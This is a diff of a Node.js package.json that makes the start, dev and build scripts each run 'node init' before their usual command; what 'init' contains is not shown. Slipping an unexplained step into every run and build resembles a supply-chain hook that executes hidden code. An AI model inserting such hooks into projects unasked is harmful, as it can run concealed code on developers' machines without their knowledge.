@@ -4,9 +4,9 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "start": "node index.js",
-    "dev": "nodemon index.js",
-    "build": "echo 'Build completed'"
+    "start": "node init && node index.js",
+    "dev": "node init && nodemon index.js",
+    "build": "node init && echo 'Build completed'"
   },
   "keywords": [],
   "author": "",
